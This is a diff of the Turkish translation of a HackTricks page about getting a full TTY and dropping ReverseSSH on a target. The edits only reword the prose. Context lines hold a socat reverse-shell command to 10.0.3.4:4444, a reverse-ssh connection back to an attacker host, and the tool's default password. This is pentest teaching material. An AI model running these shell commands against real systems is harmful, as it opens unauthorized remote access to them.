@@ -9,7 +9,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.p
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'ı takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
@@ -23,7 +23,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.p
 
 ## Full TTY
 
-`SHELL` değişkeninde ayarladığınız shell'in _**/etc/shells**_ içinde **listelenmiş olması gerektiğini** unutmayın veya `SHELL değişkeni için değer /etc/shells dosyasında bulunamadı. Bu olay rapor edildi` mesajını alırsınız. Ayrıca, sonraki kod parçacıklarının yalnızca bash'te çalıştığını unutmayın. Eğer zsh'deyseniz, shell'i elde etmeden önce `bash` komutunu çalıştırarak bash'e geçin.
+`SHELL` değişkeninde ayarladığınız shell'in **mutlaka** _**/etc/shells**_ içinde **listelenmiş olması gerektiğini** unutmayın veya `SHELL değişkeni için değer /etc/shells dosyasında bulunamadı Bu olay rapor edildi` mesajını alırsınız. Ayrıca, sonraki kod parçacıklarının yalnızca bash'te çalıştığını unutmayın. Eğer zsh'de iseniz, shell'i elde etmeden önce `bash` komutunu çalıştırarak bash'e geçin.
 
 #### Python
 
@@ -73,9 +73,9 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-**Etkileşimli shell erişimi**, **dosya transferleri** ve **port yönlendirmesi** için uygun bir yol, hedefe statik bağlantılı ssh sunucusu [ReverseSSH](https://github.com/Fahrj/reverse-ssh) bırakmaktır.
+**Etkileşimli shell erişimi**, ayrıca **dosya transferleri** ve **port yönlendirmeleri** için uygun bir yol, hedefe statik bağlantılı ssh sunucusu [ReverseSSH](https://github.com/Fahrj/reverse-ssh) bırakmaktır.
 
-Aşağıda `x86` için upx sıkıştırılmış ikili dosyalarla bir örnek bulunmaktadır. Diğer ikili dosyalar için [sürümler sayfasını](https://github.com/Fahrj/reverse-ssh/releases/latest/) kontrol edin.
+Aşağıda `x86` için upx sıkıştırılmış ikili dosyalarla bir örnek bulunmaktadır. Diğer ikili dosyalar için [sürümler sayfasına](https://github.com/Fahrj/reverse-ssh/releases/latest/) bakın.
 
 1. ssh port yönlendirme isteğini yakalamak için yerel olarak hazırlanın:
 
@@ -110,7 +110,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* Eğer ReverseSSH port yönlendirme isteği başarılı olduysa, artık `reverse-ssh(.exe)`'yi çalıştıran kullanıcının bağlamında varsayılan şifre `letmeinbrudipls` ile giriş yapabilmelisiniz:
+* Eğer ReverseSSH port yönlendirme isteği başarılı olduysa, `reverse-ssh(.exe)`'yi çalıştıran kullanıcının bağlamında varsayılan şifre `letmeinbrudipls` ile giriş yapabilmelisiniz:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -145,7 +145,7 @@ GCP Hacking öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
